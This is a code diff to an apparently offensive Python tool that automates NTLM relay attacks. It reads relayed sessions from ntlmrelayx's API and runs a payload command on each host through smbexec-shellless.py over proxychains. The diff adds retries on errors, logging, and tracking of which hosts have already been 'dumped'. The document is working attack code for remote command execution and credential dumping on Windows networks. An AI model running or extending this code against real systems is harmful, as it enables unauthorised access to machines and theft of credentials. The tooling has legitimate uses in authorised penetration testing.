@@ -1750,10 +1750,14 @@ def config_check():
 
     if fail == 1:
         printnlog('{} ERROR you are missing proxychains config'.format(red_minus))
+        os.system('touch {}/exit'.format(cwd))
+        thread1.join()
         alt_exec_exit()
 
     if sockfail >= 1:
         printnlog('{} ERROR you are missing "socks4  127.0.0.1 1080" in your proxychains config'.format(red_minus))
+        os.system('touch {}/exit'.format(cwd))
+        thread1.join()
         alt_exec_exit()
 
     printnlog('\n{}[{}Config looks good{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
@@ -1805,12 +1809,12 @@ def relayx_dump(reaper_command):
         if str(e).find('Connection refused') != -1:
             printnlog('It appears that ntlmrelayx is not running its api on port 9090 try running it with -socks')
     else:
-        if os.path.isfile('{}/hist'.format(cwd)):
+        if os.path.isfile('{}/hist'.format(cwd)): # get the hosts we have dumped before
             with open('{}/hist'.format(cwd), 'r') as f:
                 ips = f.read()
                 dumped_ips = ips.split('\n')
         if len(items) > 0:
-
+            time.sleep(5)
             tmp = result.decode()
             tmp = tmp.replace('[', '')
             tmp = tmp.replace('"', '')
@@ -1822,25 +1826,34 @@ def relayx_dump(reaper_command):
             for item in tmp:
                 relayx_dat = item.replace(']', '').split(',')
                 if relayx_dat[3] == 'TRUE':
-                    if relayx_dat[1] not in dumped_ips:
+                    if relayx_dat[1] not in dumped_ips: # make sure we dont dump ips we have already dumped
                         dumped_ips.append(relayx_dat[1])
-                        printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
-                        os.system('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
-                        with open('{}/hist'.format(cwd), 'a') as f:
-                            f.write(str(relayx_dat[1]) + '\n')
-                            f.close()
+                        printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+                        data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+                        while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1: # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
+                            data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+                        if logging.getLogger().level == logging.DEBUG: # if were debugging print the output of smbexec-shellless
+                            printnlog(data_out)
+                        else: # otherwise just log it to the outputfile
+                            lognoprint(data_out)
+                        if data_out.find('STATUS_ACCESS_DENIED') == -1 and data_out.find('STATUS_LOGON_TYPE_NOT_GRANTED') == -1 and data_out.find('Connection refused') == -1: # make sure it ran right before adding it to dumped ips
+                            with open('{}/hist'.format(cwd), 'a') as f: # keep a log of what ips have been dumped
+                                f.write(str(relayx_dat[1]) + '\n')
+                                f.close()
 
         else:
             print('No Relays Available!')
 
 def alt_exec(relayx, reaper_command):
-    thread1 = threading.Thread(target=alt_exec_newfile_printer)
+    thread1 = threading.Thread(target=alt_exec_newfile_printer) # starts our thread to print new files
     thread1.start()
 
     if relayx:
         printnlog('{} Executing {} via ntlmrelayx smbexec\n'.format(gold_plus, options.payload))
         if os.path.isfile('{}/smbexec-shellless.py'.format(cwd)) == False:
             printnlog('{} ERROR Missing smbexec-shellless.py in {}/'.format(red_minus, cwd))
+            os.system('touch {}/exit'.format(cwd))
+            thread1.join()
             alt_exec_exit()
         config_check()
         relayx_dump(reaper_command)
